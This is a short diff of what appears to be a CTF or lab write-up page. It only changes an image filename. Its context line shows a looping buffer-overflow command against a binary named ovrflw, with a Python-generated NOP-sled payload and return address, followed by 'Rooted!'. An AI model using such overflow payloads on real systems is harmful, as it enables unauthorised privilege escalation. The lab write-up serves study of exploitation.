@@ -115,6 +115,6 @@ while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (39) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (39) (1) (4).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
